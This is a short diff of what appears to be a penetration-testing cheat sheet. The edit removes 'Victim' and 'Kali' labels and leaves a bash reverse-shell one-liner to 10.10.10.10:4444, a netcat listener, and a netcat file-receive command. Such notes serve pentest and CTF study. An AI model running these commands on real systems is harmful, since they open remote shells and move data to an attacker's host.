@@ -37,9 +37,9 @@ Kali:   ```nc -lvp 4444 > file.txt```
 
 ### With bash
 
-Victim  ```bash -i >& /dev/tcp/10.10.10.10/4444 0>&1```
+```bash -i >& /dev/tcp/10.10.10.10/4444 0>&1```
 
-Kali    ```nc -lvp 4444```
+```nc -lvp 4444```
 
 ### With netcat
 
